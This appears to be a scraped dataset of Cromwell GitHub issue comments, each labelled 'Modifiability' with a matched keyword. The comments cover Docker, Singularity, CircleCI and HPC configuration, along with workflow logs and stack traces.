Modifiability,"oint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc; ```. Maybe this could be the default value in the [reference configuration file](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf) to solve the problem, but maybe it is better to have a `post-docker` configuration which is added to the pipeline similar to the `script-epilogue`. This would make easier the configuration of docker runs, separating submission and checks. By now, I will use the following local configuration to continue my work with the cromwell runner:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 15; # set the root directory to the run; filesystems.local {; ## do not allow copy (huge files); localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker container with docker rm; # finally, returns the ""real return code"" stored; submit-docker = """"""; docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; rc=$(docker wait `cat ${docker_cid}`); docker rm `cat ${docker_cid}`; exit $rc; """"""; }; ```. By the way, it looks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526:1296,config,config,1296,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526,1,['config'],['config']
Modifiability,"okay sorry I was confused then - @geoffjentry suggested that the backend.conf was part of the cromwell base:. > The idea is that this would be in the Cromwell configuration and not per-workflow (but see below). In general that makes sense because a lot of the HPC-style use cases we see people never want to use actual Docker. As opposed to a workflow or pipeline that uses it. For example, here is the pipeline that I was working on that has a `backend.conf` that runs Singularity:. https://github.com/vsoch/wgbs-pipeline/pull/1/files#diff-f6baca157827c4888c394eab694e000c. But this is not a part of cromwell, or relevant to this repo - it's just a configuration file provided with the workflow. I was under the impression that we wanted to write something that would be integrated into cromwell to interact with Singularity, and not a configuration file provided with a particular pipeline (such as the wgbs in the example above). Do you mean that there is a template folder (or some other docs) where the ""suggested singularity backend"" would be provided? Something different? What am I missing?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413205958:159,config,configuration,159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413205958,3,['config'],['configuration']
Modifiability,"okay, that works for me! To answer your questions about CircleCI:. - environment variables used in the project are [encrypted](https://circleci.com/docs/2.0/security/#encryption) also using hashicorp vault! So, same thing or if not very similar deal as what you have.; - once you set them in the interface, you can't change or see them; - if the environment variables aren't set in the container with ENV or as flags with --env then they won't be saved. You would likely want to have them be [ARGS](https://vsupalov.com/docker-arg-env-variable-guide/) instead to be used and available in the container during build, but then not persisted in the container. So, as long as:; - you set secrets in the project and not the circle.yml; - you don't allow the CI to pass on secrets to other forked build requests (you would have to turn it on in settings are there are a lot of **warning don't do this!** prompts before you get there and; - you use ARGS to expose needed variables from the environment to the container for building (that don't get saved). . I think you'd be ok :) But sure, I'm definitely not a security expert. Anyway, since it's a single file, please feel free to grab the commit from here if/when you are ready.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110:81,variab,variables,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110,8,['variab'],"['variable-guide', 'variables']"
Modifiability,"old"" : 10000; }; [2018-11-21 15:09:04,43] [info] Metadata summary refreshing every 2 seconds.; [2018-11-21 15:09:04,51] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,53] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,60] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-11-21 15:09:05,40] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Version 35; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-11-21 15:09:05,51] [info] Unspecified type (Unspecified version) workflow 02306258-436a-4372-ab54-2dcd83c42b47 submitted; [2018-11-21 15:09:05,52] [info] SingleWorkflowRunnerActor: Workflow submitted 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,53] [info] 1 new workflows fetched; [2018-11-21 15:09:05,53] [info] WorkflowManagerActor Starting workflow 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] WorkflowManagerActor Successfully started WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-11-21 15:09:05,57] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-11-21 15:09:05,58] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-11-21 15:09:06,80] [info] MaterializeWorkflowDescriptorActor [02306258]: Parsing workflow as WDL draft-2; [2018-11-21 15:09:07,34] [info] MaterializeWorkflowDescriptorActor [02306258]: Call-to-Backend assignments: test.hello -> AWSBATCH; [2018-11-21 15:09:08,72] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Starting test.hello; [2018-11-21 15:09:10,76] [info] AwsBatchAsyncBackendJobEx",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:2297,config,configured,2297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['config'],['configured']
Modifiability,"omething like that. `cd` to the directory, take the generated qsub command and try it on your cluster. Hopefully you get the same ""Illegal attribute"" error. Play around with the command until you get the correct syntax. From there we can get your Cromwell config setup such it transforms the `memory` attribute into a valid syntax. Some possible examples:. | Example qsub usage | Runtime Attribute | Description |; |------------------------|------------------------|-------------------------------------------------------------------------------------------------|; | `qsub -l mem=4.0GB …` | `Float memory_gb = 1` | decimal values allowed, units are two characters uppercase |; | `qsub -l mem=4g …` | `Int memory_gb = 1` | integer values only, no decimals, and units must be one character lowercase |; | `qsub -l mem=4000mb …` | `Int memory_mb = 1000` | integer values only, and it turns out gigabytes aren't even allowed as a unit, so use megabytes |. > I would like to use $PROJECT environment variable as the default value for raijin_project_id. Environment variables won't work within HOCON, but can be passed through down into the generated submit files. It will take a bit of escaping to get past WDL-draft2, as both POSIX and WDL-draft2 both use `${...}` for variable names. To escape past WDL-draft2, create two new runtime attributes and then use them in your submit. Example:; ```HOCON; runtime-attributes = """"""; String env_start=""${""; String env_end=""}""; # other variables here; """""". submit = """"""; qsub \; -P ${env_start}PROJECT:-raijin_project_id${env_end} \; ...; """"""; ```. > jobfs is a parameter used to control scratch space local to the execution node. Currently it is being passed as a string. Unfortunately you cannot define a parameter as rich as `memory`. For custom attributes one only has the choice of `Float`, `Int`, or `String`. If you don't like `String`, you could use a `Float` and have the WDL use `runtime { jobfs_gb: 4.0 }`, or just `runtime { jobfs: 4.0 }` and tell ev",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-492892439:1572,variab,variable,1572,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-492892439,1,['variab'],['variable']
Modifiability,"ompleting successfully; [2023-03-29 12:35:42,13] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the clu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:2967,Config,Configuring,2967,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,2,"['Config', 'config']","['Configuring', 'configuration']"
Modifiability,omwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:418); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:356); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$1.apply(StandardAsyncExecutionActor.scala:320); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$1.apply(StandardAsyncExecutionActor.scala:314); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.poll(StandardAsyncExecutionActor.scala:313); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll$1.apply(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll$1.apply(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$class.withRetry(AsyncBackendJobExecutionActor.scala:41); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$class.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:70); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromw,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1817:1633,Config,ConfigAsyncJobExecutionActor,1633,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1817,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"omwell_execution/travis/centaur_workflow/0310fa51-e985-4c54-8cdb-5058155f452e/call-centaur/cromwell_root/logs/). ```java; 2017-08-25 05:43:25,399 cromwell-system-akka.dispatchers.engine-dispatcher-51 ERROR - WorkflowManagerActor Workflow dabddbe7-a385-4df4-be97-c1ef7b884823 failed (during ExecutingWorkflowState): Could not evaluate composeEngineFunctions.y = read_int(stderr()) + x + read_string(blah); java.lang.RuntimeException: Could not evaluate composeEngineFunctions.y = read_int(stderr()) + x + read_string(blah); 	at wdl4s.wdl.WdlTask$$anonfun$4.applyOrElse(WdlTask.scala:190); 	at wdl4s.wdl.WdlTask$$anonfun$4.applyOrElse(WdlTask.scala:189); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at wdl4s.wdl.WdlTask.$anonfun$evaluateOutputs$2(WdlTask.scala:189); 	at scala.collection.TraversableOnce.$anonfun$foldLeft$1(TraversableOnce.scala:157); 	at scala.collection.TraversableOnce.$anonfun$foldLeft$1$adapted(TraversableOnce.scala:157); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableOnce.foldLeft(TraversableOnce.scala:157); 	at scala.collection.TraversableOnce.foldLeft$(TraversableOnce.scala:155); 	at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); 	at wdl4s.wdl.WdlTask.evaluateOutputs(WdlTask.scala:182); 	at cromwell.backend.wdl.OutputEvaluator$.evaluateOutputs(OutputEvaluator.scala:15); 	at cromwell.backend.standard.StandardAsyncExecutionActor.evaluateOutputs(StandardAsyncExecutionActor.scala:406); 	at cromwell.backend.standard.StandardAsyncExecutionActor.evaluateOutputs$(StandardAsyncExecutionAct",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576:1188,adapt,adapted,1188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576,1,['adapt'],['adapted']
Modifiability,"on github (affecting multiple releases tested version 86 and 85). ; Tested to not be affected version 79/56. Main error below. Should be an easy fix. . ```; Exception in thread ""main"" com.typesafe.config.ConfigException$IO: application: application.conf: java.io.IOException: resource not found on classpath: application.conf, application.json: java.io.IOException: resource not found on classpath: application.json, application.properties: java.io.IOException: resource not found on classpath: application.properties; at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:236); at com.typesafe.config.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:1525,Config,ConfigParser,1525,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigParser']
Modifiability,on.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at wdl4s.Task$$anonfun$instantiateCommand$1.apply(Task.scala:108); 	at wdl4s.Task$$anonfun$instantiateCommand$1.apply(Task.scala:108); 	at scala.util.Try$.apply(Try.scala:192); 	at wdl4s.Task.instantiateCommand(Task.scala:108); 	at cromwell.backend.wdl.Command$$anonfun$instantiate$1.apply(Command.scala:28); 	at cromwell.backend.wdl.Command$$anonfun$instantiate$1.apply(Command.scala:27); 	at scala.util.Success.flatMap(Try.scala:231); 	at cromwell.backend.wdl.Command$.instantiate(Command.scala:27); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.instantiatedCommand(StandardAsyncExecutionActor.scala:80); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.execute(SharedFileSystemAsyncJobExecutionActor.scala:130); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:264); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:258); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.executeOrRecover(StandardAsyncExecutionActor.scala:258); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.appl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:3662,Config,ConfigAsyncJobExecutionActor,3662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,2,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"on.WorkflowExecutionActor.akka$actor$Timers$$super$aroundReceive(WorkflowExecutionActor.scala:57); 	at akka.actor.Timers.aroundReceive(Timers.scala:51); 	at akka.actor.Timers.aroundReceive$(Timers.scala:40); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:57); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:614); 	at akka.actor.ActorCell.invoke(ActorCell.scala:583); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2024-03-12 18:49:15 cromwell-system-akka.actor.default-dispatcher-3 INFO - Message [cromwell.engine.workflow.lifecycle.EngineLifecycleActorAbortCommand$] from Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-262d278a-cc62-4458-9150-f31976c2c554#401797350] to Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-262d278a-cc62-4458-9150-f31976c2c554/WorkflowExecutionActor-262d278a-cc62-4458-9150-f31976c2c554#-742739735] was not delivered. [1] dead letters encountered, no more dead letters will be logged. If this is not an expected behavior, then [Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-262d278a-cc62-4458-9150-f31976c2c554/WorkflowExecutionActor-262d278a-cc62-4458-9150-f31976c2c554#-742739735]] may have terminated unexpectedly, This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; ```; ```; {; 	""status"": ""Aborting"",; 	""id"": ""262d278a-cc62-4458-9150-f31976c2c554""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385:7404,config,configuration,7404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385,1,['config'],['configuration']
Modifiability,"onActor [127f691eSomaticSNVInDel.MarkDuplicates:1:1]: Status change from - to Initializing; [2019-01-10 17:36:24,60] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:0:1]: Status change from Initializing to Running; [2019-01-10 17:36:32,19] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:1:1]: Status change from Initializing to Running; [2019-01-10 18:21:56,23] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:1:1]: Status change from Running to Succeeded; [2019-01-10 18:23:09,43] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:0:1]: Status change from Running to Succeeded; [2019-01-10 18:23:10,45] [error] WorkflowManagerActor Workflow 00d0c2df-8f87-42af-9439-b45593930c84 failed (during ExecutingWorkflowState): cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - IOException: Could not read from s3://s4-branford-dev-nphi-valinor-v2/cromwell-execution/tigris_workflow/00d0c2df-8f87-42af-9439-b45593930c84/call-SomaticSNVInDel/vc.SomaticSNVInDel/127f691e-ea2e-441f-9d58-deba01a84c5e/call-MarkDuplicates/shard-0/MarkDuplicates-0-rc.txt: s3://s3.amazonaws.com/s4-branford-dev-nphi-valinor-v2/cromwell-execution/tigris_workflow/00d0c2df-8f87-42af-9439-b45593930c84/call-SomaticSNVInDel/vc.SomaticSNVInDel/127f691e-ea2e-441f-9d58-deba01a84c5e/call-MarkDuplicates/shard-0/MarkDuplicates-0-rc.txt; Caused by: java.io.IOException: Could not read from s3://s4-branford-dev-nphi-valinor-v2/cromwell-execution/tigris_workflow/00d0c2df-8f87-42af-9439-b45593930c84/call-SomaticSNVInDel/vc.SomaticSNVInDel/127f691e-ea2e-441f-9d58-deba01a84c5e/call-MarkDuplicates/shard-0/MarkDuplicates-0-rc.txt: s3://s3.amazonaws.com/s4-branford-dev-nphi-valinor-v2/cromwell-execution/tigris_workflow/00d0c2df-8f87-42af-9439-b45593930c84/call-SomaticSNVInDel/vc.SomaticSNVInDel/127f691e-ea2e-441f-9d58-deba01a84c5e/call-MarkDuplicates/shard-0/M",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4537:4059,Enhance,EnhancedCromwellIoException,4059,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4537,1,['Enhance'],['EnhancedCromwellIoException']
Modifiability,onActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$runtimeEnvironment$1(StandardAsyncExecutionActor.scala:479); 	 at mouse.AnyOps$.$bar$greater$extension(any.scala:8); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironment(StandardAsyncExecutionActor.scala:479); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironment$(StandardAsyncExecutionActor.scala:479); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:637); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:607); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:383); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:382); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptCont,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757:5590,config,config,5590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757,1,['config'],['config']
Modifiability,onActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:140); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:124); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:121); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:599); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:599); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:599); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:912); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:904); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:3101,config,config,3101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['config'],['config']
Modifiability,onfig.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable.parse(Parseable.java:299); 	at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:689); 	at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:51); 	at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:473); 	at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:259); 	at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:256); 	at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:65); 	at 